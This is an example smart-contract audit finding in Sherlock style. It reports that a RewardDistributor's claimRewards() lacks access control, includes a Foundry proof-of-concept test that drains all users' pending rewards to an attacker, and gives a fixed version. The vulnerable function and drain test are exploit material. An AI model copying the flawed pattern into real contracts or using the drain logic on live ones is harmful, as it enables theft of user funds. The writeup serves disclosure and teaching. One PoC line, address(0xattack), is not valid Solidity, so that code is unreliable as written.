# Sherlock Finding Example

**Source:** Adapted from Sherlock contest submissions

---

## Title: `Attacker can steal all rewards from RewardDistributor due to missing access control`

## Impact
An attacker can claim all pending rewards from the RewardDistributor contract, resulting in complete loss of unclaimed rewards for all users. This affects the entire reward pool, which could be worth hundreds of thousands of dollars at the time of exploitation.

## Vulnerability Details

### Root Cause
The `claimRewards()` function in `RewardDistributor.sol` does not verify that the caller is the rightful owner of the rewards. The function accepts any `account` address parameter and sends rewards to `msg.sender`, allowing anyone to claim rewards belonging to any address.

### Affected Code
**File:** `src/rewards/RewardDistributor.sol`
**Function:** `claimRewards()`
**Lines:** 78-92

```solidity
function claimRewards(address account, uint256 amount) external {
    // BUG: No verification that msg.sender == account
    UserReward storage userReward = userRewards[account];

    require(amount <= userReward.pending, "Insufficient rewards");
    userReward.pending -= amount;

    // BUG: Sends to msg.sender, not account
    rewardToken.safeTransfer(msg.sender, amount);

    emit RewardsClaimed(account, msg.sender, amount);
}
```

The function allows:
1. Any caller to specify any `account` address
2. Rewards are deducted from `account`'s pending balance
3. Rewards are sent to `msg.sender` (not `account`)

### Attack Scenario
1. Attacker scans for addresses with pending rewards
2. Attacker calls `claimRewards(victimAddress, pendingAmount)`
3. Contract deducts from victim's pending rewards
4. Contract sends rewards to attacker
5. Attacker repeats for all users with pending rewards

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/RewardDistributor.sol";
import "../src/mocks/MockToken.sol";

contract ClaimRewardsExploit is Test {
    RewardDistributor distributor;
    MockToken rewardToken;
    address user1 = address(0x1);
    address attacker = address(0xattack);

    function setUp() public {
        rewardToken = new MockToken();
        distributor = new RewardDistributor(address(rewardToken));

        // Fund distributor with 1000 tokens
        rewardToken.mint(address(distributor), 1000 * 1e18);

        // User1 earns 100 tokens (simulate via internal function)
        vm.prank(address(distributor));
        distributor.notifyRewardAmount(user1, 100 * 1e18);
    }

    function testAttackerCanClaimAnyonesRewards() public {
        uint256 attackerInitialBalance = rewardToken.balanceOf(attacker);

        // Verify user1 has pending rewards
        assertEq(distributor.pendingRewards(user1), 100 * 1e18);

        // Exploit: Attacker claims user1's rewards
        vm.prank(attacker);
        distributor.claimRewards(user1, 100 * 1e18);

        // Verify: Attacker received the rewards
        assertEq(
            rewardToken.balanceOf(attacker) - attackerInitialBalance,
            100 * 1e18
        );

        // Verify: User1's pending rewards are now 0
        assertEq(distributor.pendingRewards(user1), 0);

        console2.log("Attacker stolen rewards:", 100 * 1e18);
    }

    function testAttackerCanDrainAllPendingRewards() public {
        address[] memory users = new address[](5);
        for (uint i = 0; i < 5; i++) {
            users[i] = address(uint160(i + 1));
            vm.prank(address(distributor));
            distributor.notifyRewardAmount(users[i], (i + 1) * 50 * 1e18);
        }

        uint256 totalPending = 0;
        for (uint i = 0; i < 5; i++) {
            totalPending += distributor.pendingRewards(users[i]);
        }

        // Attacker drains all pending rewards
        vm.startPrank(attacker);
        for (uint i = 0; i < 5; i++) {
            uint256 pending = distributor.pendingRewards(users[i]);
            distributor.claimRewards(users[i], pending);
        }
        vm.stopPrank();

        assertEq(rewardToken.balanceOf(attacker), totalPending);
        console2.log("Total stolen:", totalPending / 1e18, "tokens");
    }
}
```

## Mitigation

Add access control to ensure only the rightful owner can claim their rewards:

```solidity
function claimRewards(address account, uint256 amount) external {
    // FIX: Verify caller owns the rewards
    require(msg.sender == account, "Not your rewards");

    UserReward storage userReward = userRewards[account];
    require(amount <= userReward.pending, "Insufficient rewards");

    userReward.pending -= amount;
    rewardToken.safeTransfer(account, amount);  // FIX: Send to account

    emit RewardsClaimed(account, account, amount);
}
```

Alternatively, implement a `claimOnBehalf()` function with ERC20 approvals for delegated claiming.
